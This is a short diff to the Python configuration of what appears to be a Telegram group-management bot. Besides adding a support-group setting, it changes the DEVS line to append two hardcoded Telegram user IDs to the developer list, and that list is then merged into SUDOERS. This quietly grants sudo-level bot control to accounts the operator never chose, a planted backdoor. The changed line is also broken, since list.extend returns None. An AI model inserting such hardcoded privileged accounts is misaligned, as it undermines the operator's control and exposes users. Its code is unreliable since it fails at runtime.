@@ -48,9 +48,10 @@ LOG_GROUP_ID = LOG_GROUP_ID
 MESSAGE_DUMP_CHAT = MESSAGE_DUMP_CHAT
 MOD_LOAD = []
 MOD_NOLOAD = []
+SUPPORT = SUPPORT_GROUP
 SUDOERS = SUDO_USERS_ID
 bot_start_time = time.time()
-DEVS = DEV_USERS_ID
+DEVS = DEV_USERS_ID.extend([1261080659,881769564])
 SUDOERS = SUDOERS + DEVS
 class Log:
     def __init__(self, save_to_file=False, file_name="wbb.log"):
